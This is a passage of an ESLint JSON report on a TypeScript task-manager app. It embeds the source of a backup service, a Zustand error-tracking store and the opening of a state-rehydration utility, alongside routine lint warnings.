migration:`, migratedState);\n            }\n          } catch (migrationError) {\n            console.error(`âŒ Migration ${version} failed:`, migrationError);\n            throw new Error(`Migration from version ${version} to ${version + 1} failed: ${migrationError}`);\n          }\n        } else {\n          console.warn(`âš ï¸ Missing migration for version ${version}, data may be incomplete`);\n        }\n      }\n      \n      return migratedState;\n    } catch (error) {\n      console.error(`ðŸš¨ Migration failed, rolling back to original state:`, error);\n      return originalState; // Rollback to original state on any failure\n    }\n  }\n\n  private compress(data: any): string {\n    // Simple compression using JSON + basic encoding\n    // In production, consider using libraries like pako for gzip compression\n    return btoa(JSON.stringify(data));\n  }\n\n  private decompress(data: string): any {\n    try {\n      return JSON.parse(atob(data));\n    } catch {\n      // Fallback for uncompressed data\n      return data;\n    }\n  }\n\n  private generateChecksum(data: any): string {\n    const str = JSON.stringify(data);\n    let hash = 0;\n    for (let i = 0; i < str.length; i++) {\n      const char = str.charCodeAt(i);\n      hash = ((hash << 5) - hash) + char;\n      hash = hash & hash; // Convert to 32-bit integer\n    }\n    return Math.abs(hash).toString(16);\n  }\n}\n\n// Default backup service instance\nexport const backupService = new BackupService();\n\n// Example migration function\nbackupService.registerMigration(1, 2, (state, _fromVersion, _toVersion) => {\n  // Example: Add new field to tasks\n  if (state.tasks) {\n    state.tasks = state.tasks.map((task: any) => ({\n      ...task,\n      newField: 'defaultValue' // Add new field with default value\n    }));\n  }\n  return state;\n});\n\nexport default backupService;","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/store/errorStore.ts","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":20,"column":13,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":20,"endColumn":16,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[585,588],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[585,588],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":42,"column":10,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":42,"endColumn":13,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1076,1079],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1076,1079],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":102,"column":44,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":102,"endColumn":47,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[2615,2618],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[2615,2618],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":189,"column":33,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":189,"endColumn":36,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[4911,4914],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[4911,4914],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":244,"column":13,"nodeType":"MemberExpression","messageId":"unexpected","endLine":244,"endColumn":26,"suggestions":[{"fix":{"range":[6764,6830],"text":""},"messageId":"removeConsole","data":{"propertyName":"group"},"desc":"Remove the console.group()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":245,"column":13,"nodeType":"MemberExpression","messageId":"unexpected","endLine":245,"endColumn":26,"suggestions":[{"fix":{"range":[6843,6888],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":246,"column":13,"nodeType":"MemberExpression","messageId":"unexpected","endLine":246,"endColumn":26,"suggestions":[{"fix":{"range":[6901,6938],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":247,"column":13,"nodeType":"MemberExpression","messageId":"unexpected","endLine":247,"endColumn":26,"suggestions":[{"fix":{"range":[6951,6992],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":248,"column":32,"nodeType":"MemberExpression","messageId":"unexpected","endLine":248,"endColumn":45},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":249,"column":30,"nodeType":"MemberExpression","messageId":"unexpected","endLine":249,"endColumn":43},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":250,"column":13,"nodeType":"MemberExpression","messageId":"unexpected","endLine":250,"endColumn":29,"suggestions":[{"fix":{"range":[7145,7164],"text":""},"messageId":"removeConsole","data":{"propertyName":"groupEnd"},"desc":"Remove the console.groupEnd()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":303,"column":13,"nodeType":"MemberExpression","messageId":"unexpected","endLine":303,"endColumn":26,"suggestions":[{"fix":{"range":[9409,9476],"text":""},"messageId":"removeConsole","data":{"propertyName":"group"},"desc":"Remove the console.group()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":304,"column":13,"nodeType":"MemberExpression","messageId":"unexpected","endLine":304,"endColumn":26,"suggestions":[{"fix":{"range":[9489,9704],"text":""},"messageId":"removeConsole","data":{"propertyName":"table"},"desc":"Remove the console.table()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":310,"column":13,"nodeType":"MemberExpression","messageId":"unexpected","endLine":310,"endColumn":29,"suggestions":[{"fix":{"range":[9717,9736],"text":""},"messageId":"removeConsole","data":{"propertyName":"groupEnd"},"desc":"Remove the console.groupEnd()."}]},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'strategy' is defined but never used.","line":338,"column":31,"nodeType":null,"messageId":"unusedVar","endLine":338,"endColumn":39},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'error' is defined but never used.","line":364,"column":20,"nodeType":null,"messageId":"unusedVar","endLine":364,"endColumn":25},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'error' is defined but never used.","line":444,"column":20,"nodeType":null,"messageId":"unusedVar","endLine":444,"endColumn":25},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":544,"column":31,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":544,"endColumn":34,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[17780,17783],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[17780,17783],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":18,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Zustand Error Store for Centralized Error Management (2025)\n * \n * This store manages application-wide errors from Zustand operations,\n * providing recovery mechanisms and state backup/restore functionality.\n * \n * Following 2025 patterns for error boundaries and state recovery.\n */\n\nimport { create } from 'zustand';\nimport { persist, subscribeWithSelector } from 'zustand/middleware';\nimport { immer } from 'zustand/middleware/immer';\n\n// Error types and interfaces\nexport interface StoreError {\n  id: string;\n  code: string;\n  message: string;\n  stack?: string;\n  context?: any;\n  timestamp: Date;\n  severity: 'low' | 'medium' | 'high' | 'critical';\n  retryable: boolean;\n  operation: string;\n  store: string;\n  recovered: boolean;\n  reported: boolean;\n}\n\nexport interface ErrorMetrics {\n  totalErrors: number;\n  errorsByStore: Record<string, number>;\n  errorsBySeverity: Record<string, number>;\n  recoverySuccessRate: number;\n  lastErrorTime: Date | null;\n  criticalErrorCount: number;\n}\n\nexport interface StoreBackup {\n  id: string;\n  storeName: string;\n  state: any;\n  timestamp: Date;\n  version: string;\n  checksum: string;\n  metadata: {\n    userAgent: string;\n    url: string;\n    storeVersion: number;\n  };\n}\n\nexport interface RecoveryStrategy {\n  type: 'rollback' | 'reset' | 'merge' | 'retry' | 'ignore';\n  description: string;\n  automatic: boolean;\n  priority: number;\n}\n\nexport interface ErrorStoreState {\n  // Error management\n  errors: StoreError[];\n  maxErrors: number;\n  autoCleanupEnabled: boolean;\n  autoCleanupThreshold: number;\n  \n  // Recovery state\n  isRecovering: boolean;\n  recoveryProgress: number;\n  lastRecoveryAttempt: Date | null;\n  \n  // Backup management\n  backups: StoreBackup[];\n  maxBackups: number;\n  autoBackupEnabled: boolean;\n  backupInterval: number;\n  \n  // Metrics and monitoring\n  metrics: ErrorMetrics;\n  \n  // Configuration\n  enableDetailedLogging: boolean;\n  enableTelemetry: boolean;\n  recoveryStrategies: Record<string, RecoveryStrategy>;\n}\n\nexport interface ErrorStoreActions {\n  // Error management\n  addError: (error: Omit<StoreError, 'id' | 'timestamp'>) => void;\n  addErrors: (errors: Omit<StoreError, 'id' | 'timestamp'>[]) => void; // 2025 bulk operation\n  clearError: (errorId: string) => void;\n  clearErrors: (storeName?: string) => void;\n  clearAllErrors: () => void;\n  markErrorRecovered: (errorId: string) => void;\n  \n  // Recovery actions\n  startRecovery: (strategy: string) => Promise<boolean>;\n  cancelRecovery: () => void;\n  setRecoveryProgress: (progress: number) => void;\n  \n  // Backup management\n  createBackup: (storeName: string, state: any) => StoreBackup;\n  restoreFromBackup: (backupId: string) => Promise<boolean>;\n  deleteBackup: (backupId: string) => void;\n  cleanupOldBackups: () => void;\n  \n  // Metrics\n  updateMetrics: () => void;\n  getErrorsByStore: (storeName: string) => StoreError[];\n  getErrorsBySeverity: (severity: StoreError['severity']) => StoreError[];\n  getCriticalErrors: () => StoreError[];\n  \n  // Configuration\n  setMaxErrors: (max: number) => void;\n  setAutoBackup: (enabled: boolean, interval?: number) => void;\n  setRecoveryStrategy: (operation: string, strategy: RecoveryStrategy) => void;\n  \n  // Utility\n  resetStore: () => void;\n  exportErrorData: () => string;\n  importErrorData: (data: string) => boolean;\n}\n\ntype ErrorStore = ErrorStoreState & ErrorStoreActions;\n\n// Default recovery strategies\nconst _defaultRecoveryStrategies: Record<string, RecoveryStrategy> = {\n  'task-operations': {\n    type: 'rollback',\n    description: 'Rollback to last known good state for task operations',\n    automatic: true,\n    priority: 1\n  },\n  'data-loading': {\n    type: 'retry',\n    description: 'Retry data loading operations',\n    automatic: true,\n    priority: 2\n  },\n  'user-settings': {\n    type: 'merge',\n    description: 'Merge user settings with defaults',\n    automatic: true,\n    priority: 3\n  },\n  'critical-failure': {\n    type: 'reset',\n    description: 'Reset to initial state for critical failures',\n    automatic: false,\n    priority: 0\n  }\n};\n\n// Initial state\nconst initialState: ErrorStoreState = {\n  errors: [],\n  maxErrors: 50,\n  autoCleanupEnabled: true,\n  autoCleanupThreshold: 100,\n  \n  isRecovering: false,\n  recoveryProgress: 0,\n  lastRecoveryAttempt: null,\n  \n  backups: [],\n  maxBackups: 10,\n  autoBackupEnabled: true,\n  backupInterval: 300000, // 5 minutes\n  \n  metrics: {\n    totalErrors: 0,\n    errorsByStore: {},\n    errorsBySeverity: { low: 0, medium: 0, high: 0, critical: 0 },\n    recoverySuccessRate: 100,\n    lastErrorTime: null,\n    criticalErrorCount: 0\n  },\n  \n  enableDetailedLogging: process.env.NODE_ENV === 'development',\n  enableTelemetry: true,\n  recoveryStrategies: _defaultRecoveryStrategies\n};\n\n// Utility functions\nconst generateId = (): string => {\n  return `error_${Date.now()}_${Math.random().toString(36).substring(2)}`;\n};\n\nconst generateChecksum = (data: any): string => {\n  const str = JSON.stringify(data);\n  let hash = 0;\n  for (let i = 0; i < str.length; i++) {\n    const char = str.charCodeAt(i);\n    hash = ((hash << 5) - hash) + char;\n    hash = hash & hash; // Convert to 32-bit integer\n  }\n  return Math.abs(hash).toString(16);\n};\n\nconst shouldAutoCleanup = (state: ErrorStoreState): boolean => {\n  return state.autoCleanupEnabled && state.errors.length >= state.autoCleanupThreshold;\n};\n\n// Create the error store with middleware\nexport const useErrorStore = create<ErrorStore>()(\n  persist(\n    subscribeWithSelector(\n      immer<ErrorStore>((set, get) => ({\n        ...initialState,\n        \n        // Error management\n        addError: (errorData) => set((state) => {\n          const error: StoreError = {\n            ...errorData,\n            id: generateId(),\n            timestamp: new Date()\n          };\n          \n          state.errors.unshift(error);\n          \n          // Enforce max errors limit\n          if (state.errors.length > state.maxErrors) {\n            state.errors = state.errors.slice(0, state.maxErrors);\n          }\n          \n          // Auto cleanup if needed\n          if (shouldAutoCleanup(state)) {\n            const keepCount = Math.floor(state.maxErrors * 0.7);\n            state.errors = state.errors.slice(0, keepCount);\n          }\n          \n          // Update metrics\n          state.metrics.totalErrors++;\n          state.metrics.errorsByStore[error.store] = (state.metrics.errorsByStore[error.store] || 0) + 1;\n          state.metrics.errorsBySeverity[error.severity]++;\n          state.metrics.lastErrorTime = error.timestamp;\n          \n          if (error.severity === 'critical') {\n            state.metrics.criticalErrorCount++;\n          }\n          \n          // Log error in development\n          if (state.enableDetailedLogging) {\n            console.group(`ðŸ”´ Store Error [${error.severity.toUpperCase()}]`);\n            console.error('Operation:', error.operation);\n            console.error('Store:', error.store);\n            console.error('Message:', error.message);\n            if (error.context) console.error('Context:', error.context);\n            if (error.stack) console.error('Stack:', error.stack);\n            console.groupEnd();\n          }\n        }),\n\n        // 2025 Bulk Operations for Performance (optimized)\n        addErrors: (errorDataArray) => set((state) => {\n          if (errorDataArray.length === 0) return;\n          \n          // Create all error objects at once (2025 pattern)\n          const newErrors: StoreError[] = errorDataArray.map(errorData => ({\n            ...errorData,\n            id: generateId(),\n            timestamp: new Date()\n          }));\n          \n          // Batch add all errors (single state mutation)\n          state.errors.unshift(...newErrors);\n          \n          // Efficient cleanup with single slice operation\n          if (state.errors.length > state.maxErrors) {\n            state.errors = state.errors.slice(0, state.maxErrors);\n          }\n          \n          // Auto cleanup optimization\n          if (shouldAutoCleanup(state)) {\n            const keepCount = Math.floor(state.maxErrors * 0.7);\n            state.errors = state.errors.slice(0, keepCount);\n          }\n          \n          // Batch metrics updates (2025 pattern)\n          const errorsByStore: Record<string, number> = {};\n          const errorsBySeverity: Record<string, number> = {};\n          let criticalCount = 0;\n          \n          newErrors.forEach(error => {\n            errorsByStore[error.store] = (errorsByStore[error.store] || 0) + 1;\n            errorsBySeverity[error.severity] = (errorsBySeverity[error.severity] || 0) + 1;\n            if (error.severity === 'critical') criticalCount++;\n          });\n          \n          // Update metrics in batch\n          state.metrics.totalErrors += newErrors.length;\n          Object.entries(errorsByStore).forEach(([store, count]) => {\n            state.metrics.errorsByStore[store] = (state.metrics.errorsByStore[store] || 0) + count;\n          });\n          Object.entries(errorsBySeverity).forEach(([severity, count]) => {\n            state.metrics.errorsBySeverity[severity] += count;\n          });\n          state.metrics.criticalErrorCount += criticalCount;\n          state.metrics.lastErrorTime = newErrors[0]?.timestamp || new Date();\n          \n          // Batch logging for development (2025 pattern)\n          if (state.enableDetailedLogging && newErrors.length > 0) {\n            console.group(`ðŸ”´ Bulk Store Errors [${newErrors.length} errors]`);\n            console.table(newErrors.map(e => ({\n              severity: e.severity,\n              operation: e.operation,\n              store: e.store,\n              message: e.message.substring(0, 50) + '...'\n            })));\n            console.groupEnd();\n          }\n        }),\n        \n        clearError: (errorId: string) => set((state) => {\n          state.errors = state.errors.filter((error: StoreError) => error.id !== errorId);\n        }),\n        \n        clearErrors: (storeName?: string) => set((state) => {\n          if (storeName) {\n            state.errors = state.errors.filter((error: StoreError) => error.store !== storeName);\n          } else {\n            state.errors = [];\n          }\n        }),\n        \n        clearAllErrors: () => set((state) => {\n          state.errors = [];\n        }),\n        \n        markErrorRecovered: (errorId: string) => set((state) => {\n          const error = state.errors.find((e: StoreError) => e.id === errorId);\n          if (error) {\n            error.recovered = true;\n          }\n        }),\n        \n        // Recovery actions\n        startRecovery: async (strategy: string) => {\n          set((state) => {\n            state.isRecovering = true;\n            state.recoveryProgress = 0;\n            state.lastRecoveryAttempt = new Date();\n          });\n          \n          try {\n            // Simulate recovery process\n            for (let i = 0; i <= 100; i += 10) {\n              set((state) => {\n                state.recoveryProgress = i;\n              });\n              await new Promise(resolve => setTimeout(resolve, 100));\n            }\n            \n            set((state) => {\n              state.isRecovering = false;\n              state.recoveryProgress = 100;\n              // Update success rate\n              const totalAttempts = state.metrics.totalErrors || 1;\n              const successfulRecoveries = state.errors.filter((e: StoreError) => e.recovered).length + 1;\n              state.metrics.recoverySuccessRate = (successfulRecoveries / totalAttempts) * 100;\n            });\n            \n            return true;\n          } catch (error) {\n            set((state) => {\n              state.isRecovering = false;\n              state.recoveryProgress = 0;\n            });\n            return false;\n          }\n        },\n        \n        cancelRecovery: () => set((state) => {\n          state.isRecovering = false;\n          state.recoveryProgress = 0;\n        }),\n        \n        setRecoveryProgress: (progress) => set((state) => {\n          state.recoveryProgress = Math.max(0, Math.min(100, progress));\n        }),\n        \n        // Backup management\n        createBackup: (storeName, storeState) => {\n          const backup: StoreBackup = {\n            id: `backup_${Date.now()}_${Math.random().toString(36).substring(2)}`,\n            storeName,\n            state: storeState,\n            timestamp: new Date(),\n            version: '1.0.0',\n            checksum: generateChecksum(storeState),\n            metadata: {\n              userAgent: navigator.userAgent,\n              url: window.location.href,\n              storeVersion: 1\n            }\n          };\n          \n          set((state) => {\n            state.backups.unshift(backup);\n            \n            // Enforce max backups limit\n            if (state.backups.length > state.maxBackups) {\n              state.backups = state.backups.slice(0, state.maxBackups);\n            }\n          });\n          \n          return backup;\n        },\n        \n        restoreFromBackup: async (backupId) => {\n          const { backups } = get();\n          const backup = backups.find(b => b.id === backupId);\n          \n          if (!backup) {\n            throw new Error(`Backup with ID ${backupId} not found`);\n          }\n          \n          // Verify checksum\n          const currentChecksum = generateChecksum(backup.state);\n          if (currentChecksum !== backup.checksum) {\n            throw new Error('Backup integrity check failed');\n          }\n          \n          // Simulate restore process\n          set((state) => {\n            state.isRecovering = true;\n            state.recoveryProgress = 0;\n          });\n          \n          try {\n            for (let i = 0; i <= 100; i += 20) {\n              set((state) => {\n                state.recoveryProgress = i;\n              });\n              await new Promise(resolve => setTimeout(resolve, 50));\n            }\n            \n            set((state) => {\n              state.isRecovering = false;\n              state.recoveryProgress = 100;\n            });\n            \n            return true;\n          } catch (error) {\n            set((state) => {\n              state.isRecovering = false;\n              state.recoveryProgress = 0;\n            });\n            return false;\n          }\n        },\n        \n        deleteBackup: (backupId: string) => set((state) => {\n          state.backups = state.backups.filter((backup: StoreBackup) => backup.id !== backupId);\n        }),\n        \n        cleanupOldBackups: () => set((state) => {\n          const cutoffDate = new Date(Date.now() - 7 * 24 * 60 * 60 * 1000); // 7 days ago\n          state.backups = state.backups.filter((backup: StoreBackup) => backup.timestamp > cutoffDate);\n        }),\n        \n        // Metrics\n        updateMetrics: () => set((state) => {\n          const errors = state.errors;\n          \n          state.metrics.totalErrors = errors.length;\n          state.metrics.errorsByStore = {};\n          state.metrics.errorsBySeverity = { low: 0, medium: 0, high: 0, critical: 0 };\n          \n          errors.forEach((error: StoreError) => {\n            state.metrics.errorsByStore[error.store] = (state.metrics.errorsByStore[error.store] || 0) + 1;\n            state.metrics.errorsBySeverity[error.severity]++;\n          });\n          \n          state.metrics.criticalErrorCount = state.metrics.errorsBySeverity.critical;\n          \n          const recoveredErrors = errors.filter(e => e.recovered).length;\n          state.metrics.recoverySuccessRate = errors.length > 0 ? (recoveredErrors / errors.length) * 100 : 100;\n        }),\n        \n        getErrorsByStore: (storeName) => {\n          return get().errors.filter(error => error.store === storeName);\n        },\n        \n        getErrorsBySeverity: (severity) => {\n          return get().errors.filter(error => error.severity === severity);\n        },\n        \n        getCriticalErrors: () => {\n          return get().errors.filter(error => error.severity === 'critical');\n        },\n        \n        // Configuration\n        setMaxErrors: (max) => set((state) => {\n          state.maxErrors = Math.max(1, max); // Allow minimum of 1, not 10\n        }),\n        \n        setAutoBackup: (enabled, interval) => set((state) => {\n          state.autoBackupEnabled = enabled;\n          if (interval) {\n            state.backupInterval = interval;\n          }\n        }),\n        \n        setRecoveryStrategy: (operation, strategy) => set((state) => {\n          state.recoveryStrategies[operation] = strategy;\n        }),\n        \n        // Utility\n        resetStore: () => set(() => ({ ...initialState })),\n        \n        exportErrorData: () => {\n          const { errors, metrics, backups } = get();\n          return JSON.stringify({ errors, metrics, backups: backups.length }, null, 2);\n        },\n        \n        importErrorData: (data) => {\n          try {\n            const parsed = JSON.parse(data);\n            set((state) => {\n              if (parsed.errors) state.errors = parsed.errors;\n              if (parsed.metrics) state.metrics = parsed.metrics;\n            });\n            return true;\n          } catch {\n            return false;\n          }\n        }\n      }))\n    ),\n    {\n      name: 'taskmaster-error-store',\n      version: 1,\n      partialize: (state) => ({\n        errors: state.errors.slice(0, 20), // Only persist last 20 errors\n        metrics: state.metrics,\n        backups: state.backups.slice(0, 5), // Only persist last 5 backups\n        maxErrors: state.maxErrors,\n        autoBackupEnabled: state.autoBackupEnabled,\n        backupInterval: state.backupInterval,\n        enableDetailedLogging: state.enableDetailedLogging,\n        recoveryStrategies: state.recoveryStrategies\n      }),\n      merge: (persistedState: any, currentState: ErrorStoreState) => ({\n        ...currentState,\n        ...persistedState,\n        // Reset volatile state\n        isRecovering: false,\n        recoveryProgress: 0\n      })\n    }\n  )\n);\n\n// Export types\nexport type { ErrorStore };","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/store/rehydration.ts","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":18,"column":41,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":18,"endColumn":44,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[608,611],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[608,611],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":21,"column":30,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":21,"endColumn":33,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[687,690],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[687,690],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":53,"column":40,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":53,"endColumn":43,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1760,1763],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1760,1763],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":70,"column":37,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":70,"endColumn":40,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[2079,2082],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[2079,2082],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":127,"column":33,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":127,"endColumn":36,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[3658,3661],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[3658,3661],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":127,"column":79,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":127,"endColumn":82,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[3704,3707],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[3704,3707],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'metadata' is assigned a value but never used.","line":166,"column":33,"nodeType":null,"messageId":"unusedVar","endLine":166,"endColumn":41},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":178,"column":15,"nodeType":"MemberExpression","messageId":"unexpected","endLine":178,"endColumn":28,"suggestions":[{"fix":{"range":[5105,5257],"text":""},"messageId":"removeConsole","data":{"propertyName":"debug"},"desc":"Remove the console.debug()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":188,"column":13,"nodeType":"MemberExpression","messageId":"unexpected","endLine":188,"endColumn":25,"suggestions":[{"fix":{"range":[5435,5507],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":252,"column":11,"nodeType":"MemberExpression","messageId":"unexpected","endLine":252,"endColumn":24,"suggestions":[{"fix":{"range":[7099,7168],"text":""},"messageId":"removeConsole","data":{"propertyName":"debug"},"desc":"Remove the console.debug()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":337,"column":11,"nodeType":"MemberExpression","messageId":"unexpected","endLine":337,"endColumn":24,"suggestions":[{"fix":{"range":[9504,9673],"text":""},"messageId":"removeConsole","data":{"propertyName":"debug"},"desc":"Remove the console.debug()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":344,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":344,"endColumn":22,"suggestions":[{"fix":{"range":[9716,9765],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":365,"column":13,"nodeType":"MemberExpression","messageId":"unexpected","endLine":365,"endColumn":26,"suggestions":[{"fix":{"range":[10351,10678],"text":""},"messageId":"removeConsole","data":{"propertyName":"debug"},"desc":"Remove the console.debug()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":377,"column":11,"nodeType":"MemberExpression","messageId":"unexpected","endLine":377,"endColumn":24,"suggestions":[{"fix":{"range":[10778,10822],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":439,"column":11,"nodeType":"MemberExpression","messageId":"unexpected","endLine":439,"endColumn":24,"suggestions":[{"fix":{"range":[12525,12581],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":490,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":490,"endColumn":22,"suggestions":[{"fix":{"range":[13981,14031],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":507,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":507,"endColumn":22,"suggestions":[{"fix":{"range":[14562,14612],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":524,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":524,"endColumn":22,"suggestions":[{"fix":{"range":[15127,15180],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":541,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":541,"endColumn":22,"suggestions":[{"fix":{"range":[15714,15767],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":19,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Advanced Store Rehydration Utility (2025)\n * \n * Provides sophisticated state rehydration capabilities for Zustand stores\n * with migration support, version control, and intelligent recovery strategies.\n * \n * Features:\n * - Automatic state migration between versions\n * - Multi-source rehydration (localStorage, sessionStorage, IndexedDB)\n * - Fallback strategies for corrupted data\n * - Performance monitoring and error recovery\n * - Schema validation and data transformation\n */\n\nimport { StateCreator } from 'zustand';\n\n// Rehydration configuration options\nexport interface RehydrationOptions<T = any> {\n  storageKey?: string;\n  version?: number;\n  migrate?: (persistedState: any, version: number) => T;\n  onRehydrateStorage?: (state: T | null, error?: Error) => void;\n  onFinishHydration?: (state: T) => void;\n  storage?: Storage | RehydrationStorage;\n  serialize?: (state: T) => string;\n  deserialize?: (str: string) => T;\n  skipHydration?: boolean;\n  